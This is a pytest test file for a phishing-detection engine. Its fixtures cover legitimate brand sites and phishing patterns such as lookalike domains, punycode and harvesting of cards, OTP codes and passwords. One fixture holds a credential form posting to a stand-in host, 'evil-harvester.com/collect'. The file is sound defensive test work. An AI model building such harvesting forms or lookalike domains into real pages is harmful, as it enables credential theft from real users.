"""
Deterministic Test Fixtures and Tests for Phishing & Fake Website Detection Scenarios.

Validates Scenarios A through R:
A. Legitimate Google
B. Legitimate Microsoft
C. Legitimate Amazon
D. Legitimate Allegro
E. Fake brand subdomain
F. Random suspicious domain
G. Brand impersonation
H. Credential harvesting
I. External form submission (cross-domain)
J. Hidden credential fields
K. Suspicious redirect (unrelated domain)
L. HTTP phishing page
M. Valid SSL phishing page (SSL does not mask phishing)
N. Punycode/confusable domain
O. IP-address URL
P. Payment phishing (card details harvesting)
Q. OTP phishing (one-time passcode harvesting)
R. Account verification phishing

Plus Specific Regression Test for allegro.oferta7678678564.pl
"""

import pytest
from src.ai_analyzer import AIAnalysisEngine
from src.domain_analyzer import DomainAnalyzer
from src.brand_detector import BrandDetector
from src.models import (
    AnalysisData,
    NetworkData,
    DOMData,
    JavaScriptData,
    VisualData,
    SSLData,
)


@pytest.fixture
def ai_engine():
    """Create AIAnalysisEngine instance."""
    return AIAnalysisEngine()


def _make_base_data(**kwargs) -> AnalysisData:
    """Create a standard baseline AnalysisData with realistic authentic defaults."""
    network = kwargs.get(
        "network",
        NetworkData(
            request_count=10,
            unique_domains=["example.com", "cdn.example.com"],
            protocol_distribution={"https": 10, "http": 0},
            failed=False,
        ),
    )
    dom = kwargs.get(
        "dom",
        DOMData(
            html_content="<html><head><title>Legitimate Page</title></head><body><h1>Welcome</h1><p>Normal content</p></body></html>",
            structure_metrics={
                "element_count": 50,
                "form_count": 0,
                "iframe_count": 0,
                "script_count": 2,
                "password_input_count": 0,
                "email_input_count": 0,
                "card_input_count": 0,
                "otp_input_count": 0,
                "hidden_input_count": 0,
                "login_keyword_count": 0,
                "external_form_action_count": 0,
                "cross_domain_form_action_count": 0,
            },
            failed=False,
        ),
    )
    javascript = kwargs.get(
        "javascript",
        JavaScriptData(
            script_count=2,
            dom_modifications=10,
            external_api_calls=1,
            failed=False,
        ),
    )
    visual = kwargs.get(
        "visual",
        VisualData(
            screenshot_path="/tmp/screenshot.png",
            layout_characteristics={
                "viewport_width": 1920,
                "viewport_height": 1080,
                "has_images": True,
                "image_count": 3,
            },
            failed=False,
        ),
    )
    ssl = kwargs.get(
        "ssl",
        SSLData(
            issuer="CN=DigiCert Global Root CA, O=DigiCert Inc, C=US",
            expiration_date="2028-01-01T00:00:00Z",
            chain_valid=True,
            failed=False,
        ),
    )
    return AnalysisData(
        network=network,
        dom=dom,
        javascript=javascript,
        visual=visual,
        ssl=ssl,
    )


class TestPhishingDetectionScenarios:
    """Comprehensive test suite for legitimate sites and phishing attack patterns."""

    # =========================================================================
    # A - D: Legitimate Brand Websites
    # =========================================================================
    def test_scenario_a_legitimate_google(self, ai_engine):
        """Scenario A: Legitimate Google homepage on authorized domain."""
        url = "https://www.google.com"
        dom = DOMData(
            html_content="<html><head><title>Google</title></head><body><h1>Google Search</h1></body></html>",
            structure_metrics={"element_count": 100, "form_count": 1, "script_count": 5},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.authenticity_score >= 0.85
        assert scores.risk_level == "SAFE"
        assert len(scores.critical_indicators) == 0

    def test_scenario_b_legitimate_microsoft(self, ai_engine):
        """Scenario B: Legitimate Microsoft portal on authorized domain."""
        url = "https://www.microsoft.com"
        dom = DOMData(
            html_content="<html><head><title>Microsoft - Official Home Page</title></head><body><h1>Microsoft</h1></body></html>",
            structure_metrics={"element_count": 120, "form_count": 1, "script_count": 6},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.authenticity_score >= 0.85
        assert scores.risk_level == "SAFE"
        assert len(scores.critical_indicators) == 0

    def test_scenario_c_legitimate_amazon(self, ai_engine):
        """Scenario C: Legitimate Amazon shopping portal on authorized domain."""
        url = "https://www.amazon.com"
        dom = DOMData(
            html_content="<html><head><title>Amazon.com: Online Shopping</title></head><body><h1>Amazon</h1></body></html>",
            structure_metrics={"element_count": 250, "form_count": 2, "script_count": 10},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.authenticity_score >= 0.85
        assert scores.risk_level == "SAFE"
        assert len(scores.critical_indicators) == 0

    def test_scenario_d_legitimate_allegro(self, ai_engine):
        """Scenario D: Legitimate Allegro platform on authorized domain."""
        url = "https://allegro.pl"
        dom = DOMData(
            html_content="<html><head><title>Allegro - Atrakcyjne ceny i bezpieczne zakupy</title></head><body><h1>Allegro</h1></body></html>",
            structure_metrics={"element_count": 200, "form_count": 1, "script_count": 8},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.authenticity_score >= 0.85
        assert scores.risk_level == "SAFE"
        assert len(scores.critical_indicators) == 0

    # =========================================================================
    # E - G: Brand Impersonation & Subdomain Deception
    # =========================================================================
    def test_scenario_e_fake_brand_subdomain(self, ai_engine):
        """Scenario E: Fake brand subdomain on third-party domain."""
        url = "http://google.account-security-update.xyz"
        dom = DOMData(
            html_content="<html><head><title>Google Security Verification</title></head><body><h1>Sign in to Google</h1><input type='password'></body></html>",
            structure_metrics={"element_count": 40, "form_count": 1, "password_input_count": 1, "email_input_count": 1},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.risk_level == "PHISHING"
        assert scores.fake_score >= 0.85
        assert any("BRAND_DOMAIN_MISMATCH" in ind for ind in scores.critical_indicators)

    def test_scenario_f_random_suspicious_domain(self, ai_engine):
        """Scenario F: Random numeric/hyphen heavy domain."""
        url = "http://auth-verify-9482710385.xyz/login"
        data = _make_base_data()
        scores = ai_engine.analyze(data, url=url)
        assert scores.risk_level in ["HIGH_RISK", "SUSPICIOUS"]
        assert scores.authenticity_score <= 0.40

    def test_scenario_g_brand_impersonation_paypal(self, ai_engine):
        """Scenario G: Brand impersonation of PayPal."""
        url = "https://paypal.verification-portal-99.com/webscr"
        dom = DOMData(
            html_content="<html><head><title>PayPal - Account Verification</title></head><body><h1>Log in to PayPal</h1><input type='password'></body></html>",
            structure_metrics={"element_count": 30, "form_count": 1, "password_input_count": 1, "email_input_count": 1},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.risk_level == "PHISHING"
        assert scores.fake_score >= 0.85
        assert any("PayPal" in ind for ind in scores.critical_indicators)

    # =========================================================================
    # H - K: Credential Harvesting & Forms
    # =========================================================================
    def test_scenario_h_credential_harvesting(self, ai_engine):
        """Scenario H: Page harvesting email and password on untrusted domain."""
        url = "http://secure-login-portal.net"
        dom = DOMData(
            html_content="<form><input type='email'><input type='password'></form>",
            structure_metrics={
                "element_count": 25,
                "form_count": 1,
                "password_input_count": 1,
                "email_input_count": 1,
                "login_keyword_count": 2,
            },
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.fake_score >= 0.50
        assert any("Password input detected" in ind or "Email and password" in ind for ind in scores.suspicious_indicators)

    def test_scenario_i_external_form_submission(self, ai_engine):
        """Scenario I: Form submitting credentials to an external cross-domain server."""
        url = "https://login-service-portal.com"
        dom = DOMData(
            html_content="<form action='https://evil-harvester.com/collect'><input type='password'></form>",
            structure_metrics={
                "element_count": 20,
                "form_count": 1,
                "password_input_count": 1,
                "cross_domain_form_action_count": 1,
            },
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.risk_level == "PHISHING"
        assert any("CROSS_DOMAIN_EXFILTRATION" in ind for ind in scores.critical_indicators)

    def test_scenario_j_hidden_credential_fields(self, ai_engine):
        """Scenario J: Page with excessive hidden form fields."""
        dom = DOMData(
            html_content="<form>" + "".join(["<input type='hidden' value='token'>"] * 8) + "</form>",
            structure_metrics={"element_count": 30, "form_count": 1, "hidden_input_count": 8},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data)
        assert scores.authenticity_score <= 0.60
        assert any("hidden form inputs" in ind for ind in scores.suspicious_indicators)

    # =========================================================================
    # L - O: Protocol & Encoding Anomalies
    # =========================================================================
    def test_scenario_l_http_phishing_page(self, ai_engine):
        """Scenario L: Insecure unencrypted HTTP phishing page."""
        network = NetworkData(
            request_count=10,
            unique_domains=["phish.xyz"],
            protocol_distribution={"http": 10, "https": 0},
        )
        dom = DOMData(
            html_content="<form><input type='password'></form>",
            structure_metrics={"element_count": 20, "form_count": 1, "password_input_count": 1},
        )
        data = _make_base_data(network=network, dom=dom)
        data.ssl = SSLData(issuer="", expiration_date="", chain_valid=False, failed=False)
        scores = ai_engine.analyze(data, url="http://phish.xyz")
        assert scores.fake_score >= 0.50
        assert any("HTTP" in ind or "unencrypted" in ind for ind in scores.suspicious_indicators)

    def test_scenario_m_valid_ssl_on_phishing_page(self, ai_engine):
        """Scenario M: Phishing page with valid SSL (SSL must NOT mask phishing)."""
        url = "https://allegro.oferta7678678564.pl"
        dom = DOMData(
            html_content="<form><input type='password'></form>",
            structure_metrics={"element_count": 50, "form_count": 1, "password_input_count": 1, "email_input_count": 1},
        )
        ssl = SSLData(issuer="Let's Encrypt Authority X3", expiration_date="2027-01-01T00:00:00Z", chain_valid=True)
        data = _make_base_data(dom=dom, ssl=ssl)
        scores = ai_engine.analyze(data, url=url)
        assert scores.risk_level == "PHISHING"
        assert scores.authenticity_score <= 0.15

    def test_scenario_n_punycode_confusable_domain(self, ai_engine):
        """Scenario N: Punycode homograph domain."""
        url = "https://xn--gogle-pua.com"
        data = _make_base_data()
        scores = ai_engine.analyze(data, url=url)
        assert any("Punycode" in ind for ind in scores.suspicious_indicators)

    def test_scenario_o_ip_address_url(self, ai_engine):
        """Scenario O: URL hosted on raw IP address."""
        url = "http://198.51.100.45/portal"
        data = _make_base_data()
        scores = ai_engine.analyze(data, url=url)
        assert any("IP address" in ind for ind in scores.suspicious_indicators)

    # =========================================================================
    # P - R: High Value Credential Targeting (Payment, OTP, Verification)
    # =========================================================================
    def test_scenario_p_payment_phishing(self, ai_engine):
        """Scenario P: Credit card and CVV harvesting on unverified site."""
        url = "http://order-confirmation-update.com/pay"
        dom = DOMData(
            html_content="<form><input name='card_number'><input name='cvv'></form>",
            structure_metrics={"element_count": 30, "form_count": 1, "card_input_count": 2},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.risk_level == "PHISHING"
        assert any("Payment / credit card" in ind for ind in scores.critical_indicators)

    def test_scenario_q_otp_phishing(self, ai_engine):
        """Scenario Q: OTP / 2FA code harvesting on unverified site."""
        url = "http://secure-sms-verify.net"
        dom = DOMData(
            html_content="<form><input name='otp_code'></form>",
            structure_metrics={"element_count": 20, "form_count": 1, "otp_input_count": 1},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.risk_level == "PHISHING"
        assert any("One-Time Passcode (OTP)" in ind for ind in scores.critical_indicators)

    def test_scenario_r_account_verification_phishing(self, ai_engine):
        """Scenario R: Account verification phishing page with urgent action."""
        url = "http://account-security-alert-9923.com"
        dom = DOMData(
            html_content="<div><h2>Security Alert</h2><p>Confirm your account password to prevent suspension</p><input type='password'></div>",
            structure_metrics={"element_count": 25, "form_count": 1, "password_input_count": 1, "login_keyword_count": 3},
        )
        data = _make_base_data(dom=dom)
        scores = ai_engine.analyze(data, url=url)
        assert scores.fake_score >= 0.50
        assert any("verification language" in ind for ind in scores.suspicious_indicators)

    # =========================================================================
    # Specific Regression Test
    # =========================================================================
    def test_regression_allegro_oferta_subdomain_phishing(self, ai_engine):
        """
        Regression Test for Bug: allegro.oferta7678678564.pl MUST NOT receive Safe score.
        Must be classified as PHISHING with fake score >= 85% and brand mismatch indicator.
        """
        url = "http://allegro.oferta7678678564.pl"
        dom = DOMData(
            html_content="<html><head><title>Allegro - Logowanie</title></head><body><h1>Logowanie</h1><form><input type='password'></form></body></html>",
            structure_metrics={
                "element_count": 120,
                "form_count": 1,
                "script_count": 4,
                "password_input_count": 1,
                "email_input_count": 1,
                "login_keyword_count": 2,
            },
        )
        ssl = SSLData(issuer="Let's Encrypt Authority X3", expiration_date="2027-01-01T00:00:00Z", chain_valid=True)
        data = _make_base_data(dom=dom, ssl=ssl)
        scores = ai_engine.analyze(data, url=url)

        assert scores.risk_level == "PHISHING", f"Expected PHISHING verdict, got {scores.risk_level}"
        assert scores.authenticity_score <= 0.15, f"Authenticity score {scores.authenticity_score} too high for phishing"
        assert scores.fake_score >= 0.85
        assert any("Allegro" in ind for ind in scores.critical_indicators)
        assert any("oferta7678678564.pl" in ind for ind in scores.critical_indicators)
        assert "Valid trusted SSL certificate chain" not in scores.top_factors
